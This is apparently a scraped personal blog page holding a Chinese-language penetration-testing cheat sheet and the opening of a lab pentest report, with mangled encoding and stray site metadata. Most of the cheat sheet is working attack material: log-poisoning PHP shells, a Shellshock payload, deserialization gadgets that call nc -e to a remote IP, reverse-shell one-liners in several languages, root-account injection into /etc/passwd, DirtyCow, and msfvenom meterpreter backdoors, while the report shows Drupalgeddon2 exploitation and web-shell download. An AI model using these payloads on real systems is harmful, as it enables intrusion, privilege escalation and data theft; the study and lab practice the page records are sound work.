25MAIl FROM: &lt;Hacker&gt;RCPT TO: Usernamedata&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;.quit~~~~~&#x2F;index.php?file&#x3D;&#x2F;var&#x2F;mail&#x2F;Username&amp;pass&#x3D;nc -e &#x2F;bin&#x2F;bash 192.168.0.1 8081 SSH + LFI = GetShell 12ssh &#39;&lt;?php system($_GET[&#39;pass&#39;]); ?&gt;&#39;@192.168.0.0file.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth.log&amp;pass&#x3D;ls ProFTPd 1.3.5 mod_copy InfoLeak&amp;RCE 123456789nc 192.168.0.0 21site cpfr &#x2F;etc&#x2F;passwdsite cpto &#x2F;home&#x2F;ftp~~~~~~nc 192.168.0.0 21site cpfr &#x2F;proc&#x2F;self&#x2F;cmdlinesite cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.phpsite cpfr &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php passthru($_GET[&#39;cmd&#39;]);?&gt;.phpsite cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php ShellShock env x='() &#123; :;&#125;; echo vulnerable' bash -c &quot;echo this is a test&quot; (CVE-2014-6271) env -i X=';() &#123; (a)=&gt;\\' bash -c 'echo date'; cat echo (CVE-2014-7169) /cgi-bin/* 200 curl -H &quot;user-agent: () &#123; :; &#125;; echo; echo; /bin/bash -c 'cat /etc/passwd'&quot; http//192.168.0.0/cgi-bin/ Ruby YAML.Load() Deserialization 12345678910111213141516171819---- !ruby/object:Gem::Installer i: x- !ruby/object:Gem::SpecFetcher i: y- !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &quot;abc&quot; debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &#x27;Kernel&#x27; method_id: :system git_set: &quot;touch /tmp/hacked&quot; method_id: :resolve æƒé™æå‡ capç‰¹æƒ getcap -r / 2&gt; /dev/null Capabilities Description CAP_AUDIT_CONTROL å¯ç”¨å’Œç¦ç”¨å†…æ ¸å®¡è®¡ï¼›æ”¹å˜å®¡è®¡è¿‡æ»¤è§„åˆ™ï¼›æ£€ç´¢å®¡è®¡çŠ¶æ€å’Œè¿‡æ»¤è§„åˆ™ CAP_AUDIT_READ å…è®¸é€šè¿‡ multicast netlink å¥—æ¥å­—è¯»å–å®¡è®¡æ—¥å¿— CAP_AUDIT_WRITE å°†è®°å½•å†™å…¥å†…æ ¸å®¡è®¡æ—¥å¿— CAP_BLOCK_SUSPEND ä½¿ç”¨å¯ä»¥é˜»æ­¢ç³»ç»ŸæŒ‚èµ·çš„ç‰¹æ€§ CAP_CHOWN ä¿®æ”¹æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™ CAP_DAC_OVERRIDE å¿½ç•¥æ–‡ä»¶çš„ DAC è®¿é—®é™åˆ¶ CAP_DAC_READ_SEARCH å¿½ç•¥æ–‡ä»¶è¯»åŠç›®å½•æœç´¢çš„ DAC è®¿é—®é™åˆ¶ CAP_FOWNER å¿½ç•¥æ–‡ä»¶å±ä¸» ID å¿…é¡»å’Œè¿›ç¨‹ç”¨æˆ· ID ç›¸åŒ¹é…çš„é™åˆ¶ CAP_FSETID å…è®¸è®¾ç½®æ–‡ä»¶çš„ setuid ä½ CAP_IPC_LOCK å…è®¸é”å®šå…±äº«å†…å­˜ç‰‡æ®µ CAP_IPC_OWNER å¿½ç•¥ IPC æ‰€æœ‰æƒæ£€æŸ¥ CAP_KILL å…è®¸å¯¹ä¸å±äºè‡ªå·±çš„è¿›ç¨‹å‘é€ä¿¡å· CAP_LEASE å…è®¸ä¿®æ”¹æ–‡ä»¶é”çš„ FL_LEASE æ ‡å¿— CAP_LINUX_IMMUTABLE å…è®¸ä¿®æ”¹æ–‡ä»¶çš„ IMMUTABLE å’Œ APPEND å±æ€§æ ‡å¿— CAP_MAC_ADMIN å…è®¸ MAC é…ç½®æˆ–çŠ¶æ€æ›´æ”¹ CAP_MAC_OVERRIDE å¿½ç•¥æ–‡ä»¶çš„ DAC è®¿é—®é™åˆ¶ CAP_MKNOD å…è®¸ä½¿ç”¨ mknod() ç³»ç»Ÿè°ƒç”¨ CAP_NET_ADMIN å…è®¸æ‰§è¡Œç½‘ç»œç®¡ç†ä»»åŠ¡ CAP_NET_BIND_SERVICE å…è®¸ç»‘å®šåˆ°å°äº 1024 çš„ç«¯å£ CAP_NET_BROADCAST å…è®¸ç½‘ç»œå¹¿æ’­å’Œå¤šæ’­è®¿é—® CAP_NET_RAW å…è®¸ä½¿ç”¨åŸå§‹å¥—æ¥å­— CAP_SETGID å…è®¸æ”¹å˜è¿›ç¨‹çš„ GID CAP_SETFCAP å…è®¸ä¸ºæ–‡ä»¶è®¾ç½®ä»»æ„çš„ capabilities CAP_SETPCAP å‚è€ƒ capabilities man page CAP_SETUID å…è®¸æ”¹å˜è¿›ç¨‹çš„ UID CAP_SYS_ADMIN å…è®¸æ‰§è¡Œç³»ç»Ÿç®¡ç†ä»»åŠ¡ï¼Œå¦‚åŠ è½½æˆ–å¸è½½æ–‡ä»¶ç³»ç»Ÿã€è®¾ç½®ç£ç›˜é…é¢ç­‰ CAP_SYS_BOOT å…è®¸é‡æ–°å¯åŠ¨ç³»ç»Ÿ CAP_SYS_CHROOT å…è®¸ä½¿ç”¨ chroot() ç³»ç»Ÿè°ƒç”¨ CAP_SYS_MODULE å…è®¸æ’å…¥å’Œåˆ é™¤å†…æ ¸æ¨¡å— CAP_SYS_NICE å…è®¸æå‡ä¼˜å…ˆçº§åŠè®¾ç½®å…¶ä»–è¿›ç¨‹çš„ä¼˜å…ˆçº§ CAP_SYS_PACCT å…è®¸æ‰§è¡Œè¿›ç¨‹çš„ BSD å¼å®¡è®¡ CAP_SYS_PTRACE å…è®¸è·Ÿè¸ªä»»ä½•è¿›ç¨‹ CAP_SYS_RAWIO å…è®¸ç›´æ¥è®¿é—® /devportã€/dev/memã€/dev/kmem åŠåŸå§‹å—è®¾å¤‡ CAP_SYS_RESOURCE å¿½ç•¥èµ„æºé™åˆ¶ CAP_SYS_TIME å…è®¸æ”¹å˜ç³»ç»Ÿæ—¶é’Ÿ CAP_SYS_TTY_CONFIG å…è®¸é…ç½® TTY è®¾å¤‡ CAP_SYSLOG å…è®¸ä½¿ç”¨ syslog() ç³»ç»Ÿè°ƒç”¨ CAP_WAKE_ALARM å…è®¸è§¦å‘ä¸€äº›èƒ½å”¤é†’ç³»ç»Ÿçš„ä¸œè¥¿(æ¯”å¦‚ CLOCK_BOOTTIME_ALARM è®¡æ—¶å™¨) æµé‡ç›‘å¬ 123tcpdump -Dtimeout 120 tcpdump -i interface -w cap.pcaptcpdump -r cap.pcap 1timeout 120 tshark -i interface Shell 1234python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;python -c &#x27;import os; os.system(&quot;/bin/bash&quot;)&#x27;perl -e &#x27;exec &quot;/bin/bash&quot;;&#x27;awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27; tty(è¾“å‡ºè‡³ç»ˆç«¯/éœ€è¦æ³¨æ„ttyçš„å†™å…¥æƒé™) 123tty&#x2F;dev&#x2F;pts&#x2F;0cat &#x2F;etc&#x2F;passwd &gt; &#x2F;dev&#x2F;pts&#x2F;0 å¯†ç  å¯†ç å…±ç”¨ WEBè´¦æˆ· WEB admin SSH FTP MySQL root Redis /etc/passwd &amp; /etc/shadow 12hashcat --help | grep Unixhashcat -m 500 -a 0 -o found.txt crack.hash rockyou.txt 123echo &#x27;$1$flag$vqjCxzjtRc7PofLYS2lWf/&#x27; &gt; passwdjohn --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long passwdjohn --show passwd unshadow ssh 12/usr/share/john/ssh2john.py id_rsa &gt; sshjohn --wordlist=/usr/share/wordlists/rockyou.txt ssh wordpress â€“ PPP â€“ phpass passwd/shadow Method hashcat -m john --format= $1 md5 500 md5crypt-long $2* bcrypt(Blow Fish) 3200 bcrypt $5 sha256 7400 sha256crypt $6 sha512 1800 sha512crypt æœ¬åœ°æœåŠ¡æ¢æµ‹ netstat ss UDFææƒ æ’ä»¶è·¯å¾„: show variables like 'plugin_dir'; æ–‡ä»¶æƒé™: SHOW VARIABLES LIKE &quot;secure_file_priv&quot;; mysqld.conf: â€œsecure_file_priv=â€ è¯¥å€¼ä¸ºç©ºåˆ™æ— é™åˆ¶ è¯¥å€¼ä¸ºNULLåˆ™ä¸å¯å†™å…¥ è¯¥å€¼ä¸ºè·¯å¾„åˆ™å¯å†™å…¥è¯¥è·¯å¾„ï¼ˆä¸åŒ…å«å­è·¯å¾„ï¼‰ 123456use mysql;create table foo(line blob);insert into foo values(load_file(&#39;&#x2F;tmp&#x2F;udf.so&#39;));select * from foo into dumpfile &#39;%plugin_dir%&#x2F;udf.so&#39;;create function sys_eval returns string soname &#39;udf.so&#39;;select sys_eval(&#39;id&#39;); UDFæ–‡ä»¶(dll/so) Metasploit 1234&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_32.dll&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_32.so&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_64.dll&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql&#x2F;lib_mysqludf_sys_64.so å¯ä»¥ä½¿ç”¨IDAæ¥æŸ¥çœ‹å…·ä½“æœ‰å“ªäº›å‡½æ•° sys_get sys_exec sys_eval sys_set sys_bineval SQLMap 1234&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;32&#x2F;lib_mysqludf_sys.so_&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;linux&#x2F;64&#x2F;lib_mysqludf_sys.so_&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;windows&#x2F;32&#x2F;lib_mysqludf_sys.dll_&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;udf&#x2F;mysql&#x2F;windows&#x2F;64&#x2F;lib_mysqludf_sys.dll_ Decode python .\\cloak.py -d -i ..\\..\\udf\\mysql\\linux\\64\\lib_mysqludf_sys.so_ -o linux_udf_64.so Mysqlæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ system whoami (version &gt;= 5.7) SUDO &amp; SUID https://gtfobins.github.io/ ä½¿ç”¨Shellè„šæœ¬è¿›è¡Œææƒï¼Œå‚æ•°å¸¦æœ‰ç©ºæ ¼æ—¶éœ€è¦ç”¨å¼•å· SUID: find / -user root -perm -4000 -print 2&gt;/dev/null 123sudo susudo -icat &#x2F;etc&#x2F;sudoers æŸ¥çœ‹å¯ä»¥ä»¥sudoæ¨¡å¼è¿è¡Œçš„ç¨‹åº sudo -l å½“sudoæƒé™çš„å‘½ä»¤å—åˆ°æ‰§è¡Œè·¯å¾„çš„é™åˆ¶æ—¶ï¼Œå¯ä»¥ä½¿ç”¨../æ¥è¿›è¡Œbypass python: python -c 'import os;os.system(&quot;/bin/bash&quot;)' input(): __import__('os').system('/bin/sh') libæ–‡ä»¶å†™å…¥å‘½ä»¤ pickle unserialize 123456789import pickleimport base64import osclass RCE(object): def __reduce__(self): cmd &#x3D; (&#39;nc -e &#x2F;bin&#x2F;bash 192.168.0.1 8080&#39;) return os.system, (cmd,)if __name__ &#x3D;&#x3D; &#39;__main__&#39;: print(base64.urlsafe_b64encode(pickle.dumps(RCE()))) 1234567import pickleimport urllibclass payload(object): def __reduce__(self): return (eval,(&quot;(open(&#39;&#x2F;flag,txt&#39;),&#39;r).read()&quot;,))print(urllib.quote((pickle.dumps(payload())))) php: php -r &quot;system('/bin/bash');&quot; rpm: rpm --eval '%&#123;lua:posix.exec(&quot;/bin/bash&quot;)&#125;' dpkg 12345gem install fpmmkdir exp &amp;&amp; cd expecho -e &#39;#!&#x2F;bin&#x2F;bash\\n&#x2F;bin&#x2F;bash&#39; &gt; exp.shfpm -s dir -t deb -n exp --before-install exp.sh .&#x2F;dpkg -i exp_1.0_amd64.deb ruby: ruby -e 'exec &quot;/bin/bash&quot;' gcc: gcc -wrapper /bin/bash,-s . perl: perl -e 'exec &quot;/bin/bash&quot;;' java: 12345678910111213141516171819202122232425import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;public class sudo &#123; public static void main(String[] args) &#123; ProcessBuilder processBuilder = new ProcessBuilder(); processBuilder.command(&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;whoami &gt; whoami&quot;); try &#123; Process process = processBuilder.start(); BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream())); String line; while ((line = reader.readLine()) != null) &#123; System.out.println(line); &#125; int exitCode = process.waitFor(); System.out.println(&quot;\\nExited with error code : &quot; + exitCode); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 12javac sudo.javajava sudo mysql: mysql -e '\\! /bin/bash' nmap 2.02 &lt;= nmap -v &lt;=5.21 12nmap --interactive!sh vim æµè§ˆ/etc/shadow shell 123vim:set shell&#x3D;&#x2F;bin&#x2F;sh:shell less more nano cp è¦†ç›–passwdï¼ˆå‚ç›´ï¼‰ å†™å…¥authorized_keysï¼ˆæ°´å¹³ï¼‰ â€“no-preserve=mode mv wget find find . -exec whoami \\; find . -exec /bin/bash -p\\; 123è¯»å–ï¼š***å†™å…¥ï¼š**2æ‰§è¡Œï¼š**4(bash); 1**, *1*, **1(exec) bash bash -p awk awk '/RE/&#123;system(&quot;cat /tmp/1&quot;)&#125;' /etc/passwd &gt;&gt; /etc/passwd /tmp/1 æ˜¯å†™å¥½çš„è´¦æˆ·ä¿¡æ¯ REç”¨äºåŒ¹é…passwdä¸­æŸå•ç‹¬ä¸€è¡Œçš„ç»“å°¾éƒ¨åˆ† tee: echo 1 | tee /etc/passwd unzip 1234cat &#x2F;etc&#x2F;passwd &gt; passwdecho data &gt;&gt; passwdzip new.zip passwdunzip new.zip -d &#x2F;etc&#x2F; https://gtfobins.github.io/ $PATH ç›®æ ‡æ–‡ä»¶ä¸ºäºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ éœ€è¦çŸ¥é“ç›®æ ‡æ–‡ä»¶æ‰€æ‰§è¡Œçš„å‘½ä»¤ stringsæŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶å†…å®¹ echo 12345678cd &#x2F;tmpecho &quot;&#x2F;bin&#x2F;bash&quot; &gt; pschmod 777 psecho $PATHexport PATH&#x3D;&#x2F;tmp:$PATHcd &#x2F;usr&#x2F;bin.&#x2F;shellwhoami copy 12345678cd &#x2F;tmpcp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;pschmod 777 psecho $PATHexport PATH&#x3D;&#x2F;tmp:$PATHcd &#x2F;usr&#x2F;bin.&#x2F;shellwhoami symlink 12345678cd &#x2F;tmpln -s &#x2F;bin&#x2F;bash pschmod 777 psecho $PATHexport PATH&#x3D;&#x2F;tmp:$PATHcd &#x2F;usr&#x2F;bin.&#x2F;shellwhoami mail cat /var/spool/mail/* crontab cat /etc/crontab ls -la /var/spool/cron/ ls -la /tmp crontab -e crontabæ‰€æ‰§è¡Œçš„å‘½ä»¤ä¸€èˆ¬æ¥è¯´æ˜¯éš¾ä»¥é€šè¿‡pså‘½ä»¤æ¥å‘ç°çš„ï¼Œé™¤éæ˜¯åœ¨å‘½ä»¤æ‰§è¡Œçš„è¿‡ç¨‹ä¸­æ­£å¥½ä½¿ç”¨pså‘½ä»¤æŸ¥çœ‹è¿›ç¨‹ è¿™å¯¹äºè€—æ—¶é•¿çš„å‘½ä»¤æˆ–è€…æ˜¯ä½¿ç”¨è„šæœ¬å¾ªç¯æ‰§è¡Œå‘½ä»¤æ¥è¯´æ˜¯å¯è¡Œçš„ï¼Œä½†æ˜¯å¯¹äºå‡ ä¹ç¬æ—¶å®Œæˆçš„å‘½ä»¤åˆ™æ˜¯æŸæ‰‹æ— ç­– å¯ä»¥ä½¿ç”¨pspyæ¥æŒç»­åœ°ç›‘è§†åå°è¿›ç¨‹ https://github.com/DominicBreuker/pspy ä¸€èˆ¬çš„crontabè®¾ç½®ä¸ºæ•´åˆ†è¿è¡Œï¼Œpspyæ¯åˆ†é’Ÿçš„ç¬¬ä¸€ç§’æ˜¾ç¤ºçš„å‘½ä»¤å³ä¸ºcrontabçš„å†…å®¹ ç›®å½•æƒé™ r åˆ—å‡ºç›®å½•ä¸­çš„å†…å®¹ w åœ¨ç›®å½•ä¸­å¢åŠ åˆ é™¤æ–‡ä»¶ï¼Œä¿®æ”¹æ–‡ä»¶å x è¿›å…¥ç›®å½•ä»¥åŠå¯¹ç›®å½•ä¸‹çš„æ–‡ä»¶è¿›è¡Œæ“ä½œ r-- å¯ä»¥åœ¨ä¸è¿›å…¥ç›®å½•çš„æƒ…å†µä¸‹åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œä½†ä¸èƒ½æŸ¥çœ‹æ–‡ä»¶è¯¦ç»†ä¿¡æ¯ â€“x å¯ä»¥åœ¨å•ç‹¬åˆ—å‡ºå·²çŸ¥æ–‡ä»¶ï¼Œå¹¶æŸ¥çœ‹æ–‡ä»¶è¯¦ç»†ä¿¡æ¯ passwdå¯å†™ ls -l /etc/passwd 123openssl passwd -6 hackforfun $6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1echo &#39;test:$6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd echoå†™å…¥ä¸€å®šè¦ç”¨**'** EXPææƒ CVE-2019-7304 123456Ubuntu 18.10Ubuntu 18.04 LTSUbuntu 16.04 LTSUbuntu 14.04 LTS2.28 &lt; snapd &lt; 2.37ç½‘ç»œè¿é€š DirtyCow 12345git clone https:&#x2F;&#x2F;github.com&#x2F;dirtycow&#x2F;dirtycow.github.iocd dirtycow.github.iogcc dirtyc0w.c -o dirtycow -pthread.&#x2F;dirtycow &#x2F;etc&#x2F;group â€œ$(sed â€˜&#x2F;\\(sudo*\\)&#x2F; s&#x2F;$&#x2F;,test&#x2F;â€™ &#x2F;etc&#x2F;group)â€sudo su 40616.c æ–‡ä»¶ä¼ è¾“ FTP SCP HTTP python -m SimpleHTTPServer 80 &amp; å†…ç½‘ä»£ç† meterpreter(socks4) 123msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.1 LPORT&#x3D;2020 -f raw &gt; shell.phpmsfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.1 LPORT&#x3D;2020 -f elf &gt; shell.elfuse auxiliary&#x2F;server&#x2F;socks4a portfwd -l 2222 -p 8080 -r 127.0.0.1 (æœ¬åœ°æœåŠ¡ç«¯å£è½¬å‘/netstat) earthworm(socks5) è®¿é—®æœ¬åœ°æœåŠ¡ ngork https://ngrok.com/ https://www.tunnelnat.com/ reGeorg frp https://github.com/fatedier/frp 123456789101112131415161718#frpc.ini[common]server_addr &#x3D; 192.168.56.104server_port &#x3D; 7000[sock5_1]type &#x3D; tcpremote_port &#x3D; 45555plugin &#x3D; socks5plugin_user &#x3D; userplugin_passwd &#x3D; pass######################frps.ini[common]bind_port &#x3D; 7000dashboard_port &#x3D; 7500dashboard_user &#x3D; admindashboard_pass &#x3D; admin nps https://github.com/ehang-io/nps lcx 123456lcxé…åˆmeterpreterè¿›è¡Œå…¬ç½‘åå¼¹ShellServerä¸Šæ‰§è¡Œlcx -listen 8888 9999æœ¬åœ°æ‰§è¡Œlcx -slave Server 8888 Local_IP 7777å¹¶åœ¨MSFç›‘å¬Local_IPä¸Šçš„7777ç«¯å£(æ³¨æ„è¿™é‡Œä¸èƒ½ç”¨127.0.0.1) ç›®æ ‡æœºå™¨ä¸Šmeterpreteråå¼¹è‡³Serverçš„8888ç«¯å£ proxychain proxifier sockscap socat socat tcp-listen:1234,fork tcp-connect:localhost:8080 plink plink.exe -ssh root@192.168.0.1 -pw password -R 1234:127.0.0.1:3306 Shell nc 123nc.traditionalæ˜¯æœ€æ—©çš„ç‰ˆæœ¬(v1.10-41.1)ï¼Œè¯¥ç‰ˆæœ¬å…·æœ‰&#96;&#96;-e&#96;&#96;çš„é€‰é¡¹ï¼Œç”¨äºåå¼¹shellååˆ†æ–¹ä¾¿ubuntuä¸­çš„ncå‘½ä»¤åˆ™ä¼šæŒ‡å‘netcat-openbsdï¼Œè€Œè¯¥ç‰ˆæœ¬åˆ™æ²¡æœ‰&#96;&#96;-e&#96;&#96;çš„é€‰é¡¹ï¼Œæ— æ³•ç”¨äºåå¼¹shellncatçš„ç‰ˆæœ¬åˆ™æ¯”è¾ƒæ–°ï¼Œé›†æˆäºnmapä¸­ 1234#æ­£å‘Shellnc -lvvp 8080 -t -e /bin/bash.............................nc 192.168.0.0 8000 12345/bin/bash -i 2&gt;&amp;1 | nc 192.168.0.1 8080rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.0.1 8080 &gt;/tmp/fnc -e /bin/bash 192.168.0.1 8080.............................nc -lvnp 8080 bash 123bash -i &gt;&amp; /dev/tcp/192.168.0.1/8080 0&gt;&amp;1.............................nc -lvnp 8080 python 1python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;192.168.0.1&#x27;,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot; php 12php -r &#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.1/8080 0&gt;&amp;1&quot;)&#x27;php -r &#x27;$sock=fsockopen(&quot;192.168.0.1&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; perl 1perl -e &#x27;use Socket;$i=&quot;192.168.0.1&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27; ruby 12ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;192.168.0.1&quot;,&quot;8080&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;ruby -rsocket -e&#x27;f=TCPSocket.open(&quot;192.168.0.1&quot;,8080).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27; PowerShell å‘½ä»¤å¤šæ¡åˆ†éš”/å‘½ä»¤æ³¨å…¥: ; Secure String 12345$password &#x3D; ConvertTo-SecureString &#39;P@ssw0rd&#39; -AsPlainText -Force$Ptr &#x3D; [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($password)$result &#x3D; [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)[System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)$result jail","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"}]},{"title":"Pentest With Meterpreter","slug":"Pentest-With-Meterpreter","date":"2023-02-08T15:55:36.000Z","updated":"2023-02-08T16:08:19.000Z","comments":true,"path":"2023/02/08/Pentest-With-Meterpreter/","link":"","permalink":"https://yoloyolo.top/2023/02/08/Pentest-With-Meterpreter/","excerpt":"è¿Ÿæ¥çš„æ–‡ç« ","text":"è¿Ÿæ¥çš„æ–‡ç«  æ¸—é€æµ‹è¯•æŠ¥å‘Š 2019/1/28 16:49:43 ä»»åŠ¡è§„åˆ’ è§„åˆ’åŒºåŸŸï¼šè™šæ‹Ÿæœºä¸­çš„ä¸‰å°æœåŠ¡å™¨ æµ‹è¯•ç›®æ ‡ï¼šè·å–æ‰€æœ‰æœåŠ¡å™¨çš„rootæƒé™ æ¸—é€ç›®æ ‡ A1 hackNos(Ubuntu) IP.0:192.168.31.132 IP.1:Unknown A2 lin.security(Ubuntu) IP.0:Unknown IP.1:Unknown A3 hackNos-2(Ubuntu) IP.0:Unknown æ”»å‡»æ–¹ B Attacker(Kali) IP.0:192.168.31.10 ç½‘ç»œçŠ¶å†µï¼š Bèƒ½ä¸A1è¿›è¡Œç½‘ç»œé€šä¿¡ A1èƒ½ä¸Bå’ŒA2è¿›è¡Œç½‘ç»œé€šä¿¡ A2èƒ½ä¸A1è¿›è¡Œç½‘ç»œé€šä¿¡ hackNos ç«¯å£æ‰«æ ç”¨Nmapå¯¹ç›®æ ‡A1è¿›è¡Œç«¯å£æ‰«æ nmap -sV -p 1-1000 -T 5 -v -A -n 192.168.31.132 123456789101112131415Nmap scan report for 192.168.31.132Host is up (0.011s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 a5:a5:17:70:4d:be:48:ad:ba:64:c1:07:a0:55:03:ea (RSA)| 256 f2:ce:42:1c:04:b8:99:53:95:42:ab:89:22:66:9e:db (ECDSA)|_ 256 4a:7d:15:65:83:af:82:a3:12:02:21:1c:23:49:fb:e9 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.18 ((Ubuntu))| http-methods: |_ Supported Methods: OPTIONS GET HEAD POST|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Webè·¯å¾„æšä¸¾ dirb http://192.168.31.132 -w ç”¨dirbè¿›è¡ŒWebç›®å½•æšä¸¾ 1&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.132&#x2F;drupal&#x2F; å‘ç°WebæœåŠ¡ä¸­å­˜åœ¨Drupalæ¡†æ¶ æ¼æ´åˆ©ç”¨ æœç´¢å¾—çŸ¥Drupalæ¡†æ¶å­˜åœ¨RCEæ¼æ´ git clone https://github.com/dreadlocked/Drupalgeddon2.git å°è¯•å¯¹A1ä½¿ç”¨Exploit 123apt install rubygem install highlineruby drupalgeddon2.rb http:&#x2F;&#x2F;192.168.31.132&#x2F;drupal&#x2F; æˆåŠŸè·å–shell æƒé™æå‡ æœ¬åœ°æ„é€ Webshell 1weevely generate pass she.php å¼€å¯æœ¬åœ°WebæœåŠ¡ python -m SimpleHTTPServer 8000 &amp; åœ¨A1ä¸Šç”¨wgetè·å–WebShell wget http://192.168.31.10:8000/she.php è¿æ¥WebShell weevely http://192.168.31.132/drupal/she.php pass æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ 12uname -aLinux hackNos 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU&#x2F;Linux ç”ŸæˆMeterpreteråé—¨ç¨‹åºå¹¶æŠ•æ”¾ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=1234 -e x86/shikata_ga_nai -i 11 -f elf &gt; msf.elf åˆ©ç”¨WebShellä¸Šä¼ åé—¨ç¨‹åº file_upload /root/software/msf.elf /var/www/html/drupal/msf.elf ä½¿ç”¨MSFè¿›è¡Œæ¸—é€æ”»å‡» 12345use exploit&#x2F;multi&#x2F;handlerset payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.31.10set LPORT 1234run åœ¨A1çš„WebShellä¸­è¿è¡Œåé—¨ç¨‹åº 12chmod +x msf.elf.&#x2F;msf.elf å°†meterpreter shellè½¬ä¸ºbash 12meterpreter &gt; shellpython3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; æŸ¥çœ‹å…·æœ‰suidæƒé™ä¸”å±äºrootç”¨æˆ·çš„å‘½ä»¤ 12345678910111213141516171819202122232425find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null&lt;pal$ find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper &#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign &#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic 